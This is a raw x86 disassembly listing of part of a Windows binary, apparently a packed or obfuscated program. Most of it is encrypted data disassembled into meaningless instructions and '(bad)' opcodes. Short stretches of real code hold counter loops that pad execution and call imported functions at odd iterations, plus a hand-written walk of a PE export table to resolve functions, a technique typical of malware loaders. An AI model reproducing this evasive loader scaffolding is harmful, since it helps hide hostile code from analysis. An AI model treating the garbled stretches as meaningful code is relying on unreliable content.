  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	adc    al,0xc6
  413a69:	ins    DWORD PTR es:[edi],dx
  413a6a:	ja     0x413aea
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	(bad)
  413a76:	mov    esi,0x9a419ffa
  413a7b:	mov    dl,0x74
  413a7d:	lds    ebx,FWORD PTR [edx]
  413a7f:	add    dh,BYTE PTR [ebx-0x5bc3c67]
  413a85:	pop    esp
  413a87:	xor    bh,BYTE PTR fs:[edi+0x79]
  413a8b:	lds    edi,FWORD PTR [ebp-0x3966ab37]
  413a91:	inc    eax
  413a92:	je     0x413b09
  413a94:	out    dx,eax
  413a95:	pop    eax
  413a96:	dec    ecx
  413a97:	(bad)  
  413a98:	(bad)  
  413a99:	frstor [eax]
  413a9b:	pop    eax
  413a9c:	inc    eax
  413a9d:	js     0x413acf
  413a9f:	mov    cl,bh
  413aa1:	xchg   BYTE PTR cs:[ebx],ah
  413aa4:	fisubr WORD PTR [edx]
  413aa6:	push   ds
  413aa7:	sbb    DWORD PTR [ebx+0x10],esi
  413aaa:	adc    cl,bl
  413aac:	jecxz  0x413b11
  413aae:	repnz nop DWORD PTR [ebp-0x7b062a4a]
  413ab6:	pop    es
  413ab7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ab8:	(bad)
  413abb:	dec    esi
  413abc:	outs   dx,DWORD PTR ds:[esi]
  413abd:	adc    al,0x12
  413abf:	(bad)  
  413ac0:	pop    esi
  413ac1:	in     al,dx
  413ac2:	mov    es,eax
  413ac4:	inc    esp
  413ac5:	ficomp WORD PTR [ebp+0x23afdd39]
  413acb:	adc    eax,0x12bb4a4
  413ad0:	out    0xfe,al
  413ad2:	jmp    0x413a78
  413ad4:	fcomp  st(6)
  413ad6:	and    BYTE PTR [edi-0x14],0x9b
  413ada:	leave  
  413adb:	aaa    
  413adc:	mov    al,0xb
  413ade:	push   ebp
  413adf:	dec    edi
  413ae0:	sbb    dh,BYTE PTR [ebx-0x51]
  413ae3:	jo     0x413af4
  413ae5:	ret    
  413ae6:	rcl    BYTE PTR [edi],1
  413ae8:	dec    esp
  413ae9:	icebp  
  413aea:	adc    DWORD PTR [ebp+0x2e],ecx
  413aed:	mov    eax,ds:0xc9ad4b9b
  413af2:	test   ch,cl
  413af4:	push   esp
  413af5:	sar    DWORD PTR [ecx+0x267931a5],0x84
  413afc:	icebp  
  413afd:	lods   eax,DWORD PTR ds:[esi]
  413afe:	int    0xa2
  413b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b01:	fwait
  413b02:	das    
  413b03:	adc    bl,al
  413b05:	xor    DWORD PTR [edx],ebp
  413b07:	push   esp
  413b08:	dec    edi
  413b09:	cmp    al,0xb4
  413b0b:	dec    ecx
  413b0c:	sub    BYTE PTR [esi-0x6b],ch
  413b0f:	stos   DWORD PTR es:[edi],eax
  413b10:	xchg   ecx,eax
  413b11:	mov    edi,DWORD PTR [eax-0x1d60a679]
  413b17:	or     eax,0x7865d696
  413b1c:	and    BYTE PTR [edx],ch
  413b1e:	repnz aaa 
  413b20:	rol    DWORD PTR [ecx+0x73],1
  413b23:	cld    
  413b24:	dec    ebx
  413b25:	xchg   ebp,eax
  413b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b27:	nop
  413b28:	push   cs
  413b29:	loopne 0x413b32
  413b2b:	es and al,0xc4
  413b2e:	fild   WORD PTR [esi+0x4a]
  413b31:	fdivr  DWORD PTR [edi]
  413b33:	in     al,0x32
  413b35:	xor    DWORD PTR [edx-0x28287b99],eax
  413b3b:	add    ecx,DWORD PTR [ecx]
  413b3d:	xor    BYTE PTR ds:0x803c23ff,bl
  413b43:	pop    es
  413b44:	fdiv   DWORD PTR [ebx]
  413b46:	mov    edi,0x6daf4556
  413b4b:	fild   QWORD PTR [edx]
  413b4d:	mov    dh,0xc4
  413b4f:	sub    eax,0xbf0e57d
  413b54:	dec    esi
  413b55:	and    DWORD PTR [edi-0x35],ebx
  413b58:	push   cs
  413b59:	sbb    eax,0xc080f226
  413b5e:	jmp    0x3364:0xee7e7202
  413b65:	xor    eax,0x5ac4d0ca
  413b6a:	mov    al,ds:0x7555f5c5
  413b6f:	add    eax,eax
  413b71:	sbb    eax,0x3097fc07
  413b76:	mov    cl,ch
  413b78:	cmp    al,0x15
  413b7a:	xchg   esp,eax
  413b7b:	aam    0x17
  413b7d:	jne    0x413b63
  413b7f:	dec    edx
  413b80:	xchg   edx,eax
  413b81:	jmp    0x50abd8b4
  413b86:	mov    ebp,0x9df58a6e
  413b8b:	xchg   BYTE PTR [ebx-0x6f],cl
  413b8e:	lods   al,BYTE PTR ds:[esi]
  413b8f:	jbe    0x413bae
  413b91:	xchg   DWORD PTR [esi],ebx
  413b93:	setbe  BYTE PTR ss:0xa4ced604
  413b9b:	ins    BYTE PTR es:[edi],dx
  413b9c:	(bad)  
  413b9e:	mov    esi,0xac9cc1fa
  413ba3:	push   esp
  413ba4:	pop    esi
  413ba5:	adc    DWORD PTR [eax+0x32],edx
  413ba8:	outs   dx,DWORD PTR ds:[esi]
  413ba9:	xor    BYTE PTR [eax],0x8b
  413bac:	cld    
  413bad:	mov    al,ds:0x97b12e65
  413bb2:	hlt    
  413bb3:	call   0x37f9c228
  413bb8:	mov    esp,0x6ef082e4
  413bbd:	scas   eax,DWORD PTR es:[edi]
  413bbe:	xor    dl,ch
  413bc0:	out    dx,al
  413bc1:	pushw  ss
  413bc3:	jle    0x413b6e
  413bc5:	xor    al,0x4d
  413bc7:	jns    0x413b61
  413bc9:	int3   
  413bca:	cmp    BYTE PTR [edx+0xd121da9],cl
  413bd0:	out    0x63,eax
  413bd2:	xor    bl,dl
  413bd4:	mov    BYTE PTR [esi+0xc2a7744],al
  413bda:	ins    DWORD PTR es:[edi],dx
  413bdb:	jecxz  0x413bb4
  413bdd:	sbb    ch,BYTE PTR [ecx]
  413bdf:	out    0xa1,al
  413be1:	push   eax
  413be2:	repz sbb bh,dl
  413be5:	xchg   DWORD PTR [edx],ebp
  413be7:	and    al,0xc8
  413be9:	fldcw  WORD PTR [edi-0x59c4fa77]
  413bef:	shl    DWORD PTR [ebx],0xd9
  413bf2:	scas   eax,DWORD PTR es:[edi]
  413bf3:	in     al,0x7a
  413bf5:	test   DWORD PTR [esi],eax
  413bf7:	add    al,0xbd
  413bf9:	mov    WORD PTR [eax*4-0x62c6608],ss
  413c00:	adc    DWORD PTR ds:0xca238cff,0xfffffff6
  413c07:	lea    ecx,[edi+0x9]
  413c0a:	cmp    ah,dh
  413c0c:	mov    dl,0xea
  413c0e:	or     ecx,edi
  413c10:	add    esp,ebx
  413c12:	aad    0x8a
  413c14:	jb     0x413ba7
  413c16:	not    ch
  413c18:	cli    
  413c19:	or     BYTE PTR [ebx],ah
  413c1b:	pop    ds
  413c1c:	xchg   ebx,eax
  413c1d:	mov    cl,0x84
  413c1f:	push   esi
  413c20:	add    al,0x80
  413c22:	iret   
  413c23:	test   eax,0xca12e0fb
  413c28:	mov    DWORD PTR [edx],edx
  413c2a:	jmp    0x28a5650d
  413c2f:	call   0x10f02333
  413c34:	dec    ecx
  413c35:	pop    eax
  413c36:	scas   eax,DWORD PTR es:[edi]
  413c37:	mov    ebx,0x1d4da95e
  413c3c:	add    BYTE PTR [ebp-0x25],dl
  413c3f:	icebp  
  413c40:	or     al,0x9b
  413c42:	xchg   ecx,eax
  413c43:	aaa    
  413c44:	loope  0x413bd3
  413c46:	(bad)  
  413c47:	out    0x8b,al
  413c49:	mov    cl,0x13
  413c4b:	and    al,0xde
  413c4d:	jle    0x413bf7
  413c4f:	dec    edx
  413c50:	sub    esp,DWORD PTR [ecx-0x4d024b94]
  413c56:	shr    ch,0x8b
  413c59:	dec    ebp
  413c5a:	jns    0x413ca5
  413c5c:	stos   DWORD PTR es:[edi],eax
  413c5d:	cmp    al,0xfd
  413c5f:	mov    eax,ecx
  413c61:	inc    eax
  413c62:	sar    BYTE PTR [esi+0x705b01e7],0x18
  413c69:	aaa    
  413c6a:	add    eax,0xd51b3a8e
  413c6f:	adc    DWORD PTR [edi+0x6ce3b78e],0xba1d1da6
  413c79:	mov    ds:0x8d5cc060,eax
  413c7e:	inc    edx
  413c7f:	xchg   ecx,eax
  413c80:	mov    bl,0xd6
  413c82:	inc    esi
  413c83:	test   al,0x93
  413c85:	add    eax,0x28
  413c88:	ds stos DWORD PTR es:[edi],eax
  413c8a:	inc    eax
  413c8b:	call   0x52b7:0x97d6313f
  413c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c93:	inc    eax
  413c94:	sub    BYTE PTR [esi+0x55],ch
  413c97:	pop    ebp
  413c98:	or     cl,BYTE PTR [edx-0x7b]
  413c9b:	mov    ecx,0x2d069ece
  413ca0:	loopne 0x413c7a
  413ca2:	jmp    0x5f3ef6a6
  413ca7:	sub    ch,BYTE PTR [edx+0x44a579eb]
  413cad:	mov    al,ds:0xa45d9632
  413cb2:	ret    0x14f4
  413cb5:	xchg   esp,eax
  413cb6:	jno    0x413c9d
  413cb8:	test   al,0xd7
  413cba:	pop    ecx
  413cbb:	push   0x23
  413cbd:	xlat   BYTE PTR ds:[ebx]
  413cbe:	and    ah,BYTE PTR [ebp-0x80]
  413cc1:	lahf   
  413cc2:	repnz out 0x94,eax
  413cc5:	(bad)  [eax-0x59953cdc]
  413ccb:	jmp    0xff8a4679
  413cd0:	mov    esi,0x2c089
  413cd5:	cmp    DWORD PTR [edi-0x14d12dcc],edi
  413cdb:	sbb    al,0xac
  413cdd:	ds adc esp,ecx
  413ce0:	jecxz  0x413d55
  413ce2:	imul   esi,DWORD PTR [esi+eax*1-0x7d13378f],0x30
  413cea:	adc    al,0x11
  413cec:	in     eax,dx
  413ced:	jae    0x413c73
  413cef:	xchg   edi,eax
  413cf0:	ds scas al,BYTE PTR es:[edi]
  413cf2:	xor    BYTE PTR ds:0xa8ff2abb,dl
  413cf8:	retf   0xb278
  413cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cfc:	lods   al,BYTE PTR ds:[esi]
  413cfd:	and    eax,0xb62937b6
  413d02:	sbb    edx,DWORD PTR [edi+0x293d91]
  413d08:	aam    0xf2
  413d0a:	pop    ebp
  413d0b:	fst    DWORD PTR [ebp+0x365b9464]
  413d11:	mov    edx,0x392915ab
  413d16:	enter  0x1da7,0xb8
  413d1a:	jbe    0x413d4c
  413d1c:	outs   dx,BYTE PTR ds:[esi]
  413d1d:	mov    al,0xb7
  413d1f:	jnp    0x413cb4
  413d21:	aaa    
  413d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d23:	adc    DWORD PTR [edi],esi
  413d25:	fcomp  DWORD PTR [ebx+0x123f6b3e]
  413d2b:	xchg   esp,eax
  413d2c:	jns    0x413d7c
  413d2e:	stos   DWORD PTR es:[edi],eax
  413d2f:	push   ss
  413d30:	loope  0x413d76
  413d32:	mov    bh,0x22
  413d34:	xor    al,BYTE PTR [eax+eiz*4+0x51]
  413d38:	jge    0x413d6f
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	cmp    ebx,DWORD PTR [edx+0x76474452]
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0x6470707e
  413e98:	add    eax,0xdcee4477
  413e9d:	or     edx,edx
  413e9f:	scas   eax,DWORD PTR es:[edi]
  413ea0:	adc    dl,BYTE PTR [esi+0x335842de]
  413ea6:	mov    ds:0x263958ad,al
  413eab:	inc    ebx
  413eac:	inc    edi
  413ead:	(bad)  
  413eae:	mov    ecx,0xbd66d76
  413eb3:	or     esi,DWORD PTR [ecx+0x5b13fcdb]
  413eb9:	fiadd  DWORD PTR [eax+0x61c85b8f]
  413ebf:	push   ebx
  413ec0:	imul   eax,DWORD PTR [ebx],0x3e
  413ec3:	sub    bl,bl
  413ec5:	call   0x8883fe6b
  413eca:	or     BYTE PTR [ecx+edx*4],ch
  413ecd:	aam    0x7e
  413ecf:	enter  0x233d,0xf9
  413ed3:	inc    eax
  413ed4:	xchg   ebx,eax
  413ed5:	arpl   sp,di
  413ed7:	lea    esp,[edi+0x5b]
  413eda:	pop    ss
  413edb:	shr    DWORD PTR [ebp-0x70],1
  413ede:	rcl    BYTE PTR cs:[edi],0x8d
  413ee2:	sub    BYTE PTR [esp+eax*1+0x48ab7c26],0x66
  413eea:	dec    esi
  413eeb:	xchg   esp,eax
  413eec:	dec    ebx
  413eed:	loopne 0x413e77
  413eef:	iret   
  413ef0:	int3   
  413ef1:	js     0x413f3d
  413ef3:	cmp    DWORD PTR [edx+0x4f],ebp
  413ef6:	enter  0xd617,0x8
  413efa:	scas   al,BYTE PTR es:[edi]
  413efb:	push   eax
  413efc:	sbb    ebx,edi
  413efe:	and    edx,DWORD PTR [esi+0x5d]
  413f01:	in     eax,dx
  413f02:	imul   ebx,DWORD PTR [edi+0x5e],0x76
  413f06:	cmp    DWORD PTR [ecx+edi*1],esp
  413f09:	xchg   esi,eax
  413f0a:	cmp    al,0x9c
  413f0c:	imul   eax,ebp,0xffffffbc
  413f0f:	pop    ebx
  413f10:	in     eax,dx
  413f11:	iret   
  413f12:	int    0xf8
  413f14:	ins    BYTE PTR es:[edi],dx
  413f15:	and    eax,0x259ce62d
  413f1a:	(bad)  
  413f1b:	sbb    DWORD PTR ds:0x7a5514b1,esp
  413f21:	cmp    DWORD PTR [ecx],0xffffffd2
  413f24:	cmp    BYTE PTR [ebx+ebx*2],cl
  413f27:	jp     0x413ed6
  413f29:	leave  
  413f2a:	mov    esp,0x28e319fa
  413f2f:	dec    esi
  413f30:	push   0xffffffa0
  413f32:	test   ecx,ecx
  413f34:	pop    ebx
  413f35:	xor    eax,0xa9b20d62
  413f3a:	adc    DWORD PTR [ecx-0x65],ecx
  413f3d:	(bad)  
  413f3f:	ficom  WORD PTR [ecx]
  413f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f42:	popf   
  413f43:	cld    
  413f44:	out    0x17,eax
  413f46:	cmp    dl,bh
  413f48:	mov    al,ds:0xf0bb6254
  413f4d:	loop   0x413fb7
  413f4f:	mov    ah,0x38
  413f51:	sbb    esp,DWORD PTR [esi+0x7fd715cb]
  413f57:	mov    DWORD PTR [ecx-0x6],eax
  413f5a:	and    bl,BYTE PTR cs:[ebp-0x48f0bc3e]
  413f61:	popa   
  413f62:	sbb    al,0x28
  413f64:	mov    edx,es
  413f66:	fadd   QWORD PTR [ecx]
  413f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f69:	pop    bx
  413f6b:	or     DWORD PTR [esi+ebp*2-0x4c],esp
  413f6f:	cmp    BYTE PTR [edi-0x72],bl
  413f72:	das    
  413f73:	clc    
  413f74:	cmp    al,0x35
  413f76:	push   0x36
  413f78:	xor    DWORD PTR [ecx-0x4a7c5851],edi
  413f7e:	mov    ebx,0xd3084820
  413f83:	cmp    ebx,DWORD PTR [esi+0x3a8f00f3]
  413f89:	nop
  413f8a:	test   DWORD PTR [edi-0x15],edx
  413f8d:	je     0x413fa0
  413f8f:	xor    BYTE PTR ds:0xb911ed33,0xe1
  413f96:	or     al,0x55
  413f98:	rol    DWORD PTR [edi-0x4f],1
  413f9b:	sub    esp,DWORD PTR [edx]
  413f9d:	and    BYTE PTR [ebp+0x6],al
  413fa0:	sub    BYTE PTR [eax],cl
  413fa2:	inc    edi
  413fa3:	mov    dh,0x85
  413fa5:	fbstp  TBYTE PTR [ebx+0x18]
  413fa8:	or     ah,BYTE PTR ds:0xc7c7be34
  413fae:	pushf  
  413faf:	ja     0x413fb2
  413fb1:	(bad)  
  413fb2:	pop    eax
  413fb3:	dec    ecx
  413fb4:	sub    DWORD PTR [ebp+0x12d10812],edx
  413fba:	adc    BYTE PTR [esi+eiz*4-0x59ae008b],ah
  413fc1:	ret    0x79ad
  413fc4:	rcl    cl,cl
  413fc6:	mov    esp,0x70c5ae61
  413fcb:	push   ds
  413fcc:	jg     0x413ff0
  413fce:	loopne 0x413fd2
  413fd0:	mov    esi,0x98ef2c35
  413fd5:	neg    eax
  413fd7:	xor    dh,BYTE PTR [ebp-0x1ad18bb3]
  413fdd:	pop    esi
  413fde:	jbe    0x413fd7
  413fe0:	mov    esi,0x2058deff
  413fe5:	pusha  
  413fe6:	cmp    eax,0xd12a68a0
  413feb:	add    BYTE PTR [eax+edx*4],dh
  413fee:	mov    ecx,0x1cd6c690
  413ff3:	inc    esi
  413ff4:	jno    0x414055
  413ff6:	jne    0x414029
  413ff8:	xchg   BYTE PTR [esi+0x1a9e53d0],cl
  413ffe:	jle    0x413ffd
  414000:	pop    ss
  414001:	mov    DWORD PTR ds:0x6d687b72,edi
  414008:	pop    ss
  414009:	pop    es
  41400a:	jp     0x413fae
  41400c:	push   edi
  41400d:	or     edi,DWORD PTR [edi]
  41400f:	in     al,dx
  414010:	mov    dl,0x71
  414012:	xchg   DWORD PTR fs:0x356d60a0,esi
  414019:	mov    edx,0xd45b8881
  41401e:	dec    esi
  41401f:	scas   eax,DWORD PTR es:[edi]
  414020:	mov    eax,0x28e677f1
  414025:	shl    BYTE PTR [ebx+ebp*4-0x7c],cl
  414029:	loope  0x414052
  41402b:	in     eax,dx
  41402c:	gs cs scas eax,DWORD PTR es:[edi]
  41402f:	nop
  414030:	inc    ebp
  414031:	dec    ebp
  414032:	xor    bl,ah
  414034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414035:	pusha  
  414036:	xchg   edx,eax
  414037:	fs ja  0x41408b
  41403a:	(bad)  
  41403b:	pop    edi
  41403c:	dec    eax
  41403d:	cwde   
  41403e:	sbb    al,0x37
  414040:	fisub  WORD PTR [edx-0x3]
  414043:	sbb    al,0xc8
  414045:	(bad)  
  414046:	adc    dh,ch
  414048:	stos   BYTE PTR es:[edi],al
  414049:	test   ah,cl
  41404b:	(bad)  
  41404c:	lds    eax,FWORD PTR [esi+0x77685c24]
  414052:	sbb    al,0x6d
  414054:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414055:	inc    eax
  414056:	enter  0x2092,0xa1
  41405a:	jge    0x414011
  41405c:	adc    dl,BYTE PTR [ecx]
  41405e:	cmc    
  41405f:	les    esp,FWORD PTR [ebp+0x3]
  414062:	lods   al,BYTE PTR ds:[esi]
  414063:	mov    ebp,0xa0f997e0
  414068:	jmp    0x15d7cdc2
  41406d:	mov    al,BYTE PTR [ecx-0x75e81c5b]
  414073:	shl    cl,cl
  414075:	rol    ch,cl
  414077:	dec    edi
  414078:	retf   
  414079:	dec    ecx
  41407a:	aad    0xb8
  41407c:	mov    al,0xe7
  41407e:	cmp    edx,DWORD PTR fs:[ecx-0x2f]
  414082:	test   ebp,eax
  414084:	lods   eax,DWORD PTR ds:[esi]
  414085:	aaa    
  414086:	mov    esi,0x7a35d3fb
  41408b:	stos   DWORD PTR es:[edi],eax
  41408c:	mov    esi,cs
  41408e:	and    al,0x21
  414090:	jns    0x414084
  414092:	jle    0x4140fe
  414094:	dec    ecx
  414095:	or     al,0xb6
  414097:	dec    edx
  414098:	push   ebp
  414099:	fmul   st(7),st
  41409b:	enter  0xfd48,0x1c
  41409f:	inc    ebp
  4140a0:	fwait
  4140a1:	in     eax,dx
  4140a2:	pop    ecx
  4140a3:	in     eax,0x5f
  4140a5:	mov    eax,0x2804031f
  4140aa:	ror    DWORD PTR [ebp+eax*8-0x5271d0e8],0x1d
  4140b2:	adc    al,BYTE PTR [ecx]
  4140b4:	cwde   
  4140b5:	repnz (bad)
  4140b8:	ds cmp eax,0xd04bff6
  4140be:	vunpcklpd ymm5,ymm5,YMMWORD PTR [edx+0x45792221]
  4140c6:	ds add ebx,edi
  4140c9:	sbb    BYTE PTR [edi],dh
  4140cb:	add    ecx,DWORD PTR [ecx]
  4140cd:	push   0x12
  4140cf:	and    eax,0x3aeddc7f
  4140d4:	adc    dl,BYTE PTR [esi+0x67]
  4140d7:	scas   eax,DWORD PTR es:[edi]
  4140d8:	sbb    ebx,DWORD PTR [esi+eiz*2+0x5c]
  4140dc:	test   al,0x60
  4140de:	ret    
  4140df:	lods   al,BYTE PTR ds:[esi]
  4140e0:	ss jno 0x41410c
  4140e3:	into   
  4140e4:	cli    
  4140e5:	mov    al,ds:0x89c309c0
  4140ea:	mov    al,ds:0x4b72cc41
  4140ef:	loopne 0x4140c0
  4140f1:	or     eax,edx
  4140f3:	mov    ah,0x5e
  4140f5:	push   eax
  4140f7:	retf   0x5f34
  4140fa:	dec    esp
  4140fb:	add    bh,ah
  4140fd:	dec    ebp
  4140fe:	sti    
  4140ff:	into   
  414100:	cmp    dh,BYTE PTR [esi+0x77]
  414103:	inc    eax
  414104:	jnp    0x4140b2
  414106:	out    0x54,al
  414108:	push   cs
  414109:	stc    
  41410a:	retf   
  41410b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41410c:	cdq    
  41410d:	les    ebp,FWORD PTR [edi+edx*8-0x173e6b05]
  414114:	in     eax,dx
  414115:	into   
  414116:	mov    ch,0xfe
  414118:	cwde   
  414119:	sub    bl,BYTE PTR [edx+edx*4+0x7f]
  41411d:	hlt    
  41411e:	aam    0xe2
  414120:	mov    ecx,0xdb61e22d
  414125:	scas   al,BYTE PTR es:[edi]
  414126:	cmp    DWORD PTR [esi-0x454a05d6],esp
  41412c:	jns    0x4140ba
  41412e:	mov    edi,0x11369bc9
  414133:	sub    eax,0x2e1c314f
  414138:	sub    al,0xa8
  41413a:	pop    edi
  41413b:	ja     0x4141b8
  41413d:	jecxz  0x4141b9
  41413f:	test   DWORD PTR [edx+0x51],ebx
  414142:	lahf   
  414143:	mov    DWORD PTR [esi-0x51],esi
  414146:	jae    0x414132
  414148:	push   0xffffffbf
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	mov    ebp,0x8565c778
  414150:	sbb    BYTE PTR [ebx+0x1d],0x89
  414154:	mov    edx,0x722290a2
  414159:	test   BYTE PTR [edi],cl
  41415b:	adc    dl,ch
  41415d:	or     DWORD PTR [ebx+0x2581ec45],0x42fcd5
  414167:	add    BYTE PTR [eax],al
  414169:	add    BYTE PTR [eax],al
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414266
  414283:	js     0x41426f
  414285:	fld    DWORD PTR [eax-0x468f8f8d]
  41428b:	jle    0x4142fd
  41428d:	jo     0x414305
  41428f:	inc    edi
  414290:	ins    DWORD PTR es:[edi],dx
  414291:	outs   dx,BYTE PTR ds:[esi]
  414292:	imul   ebx,DWORD PTR [edx-0x22],0xffffff8f
  414296:	popa   
  414297:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414299:	fdiv   DWORD PTR [edx+edx*4+0x4343e7fb]
  4142a0:	test   DWORD PTR [edi-0x6b],edx
  4142a3:	pop    esp
  4142a4:	mov    al,ds:0x36f818f8
  4142a9:	(bad)  
  4142aa:	xchg   esi,eax
  4142ab:	outs   dx,DWORD PTR ds:[esi]
  4142ac:	(bad)  
  4142ad:	mov    ecx,0x466745ec
  4142b2:	xchg   DWORD PTR [edi],ecx
  4142b4:	and    bh,dl
  4142b6:	sar    BYTE PTR [edx+0x51],1
  4142b9:	ja     0x4142ce
  4142bb:	fld    TBYTE PTR [esi-0x17b0efb]
  4142c1:	mov    ecx,0xa86b264b
  4142c6:	xor    BYTE PTR [edx-0x33],0xa3
  4142ca:	loop   0x414318
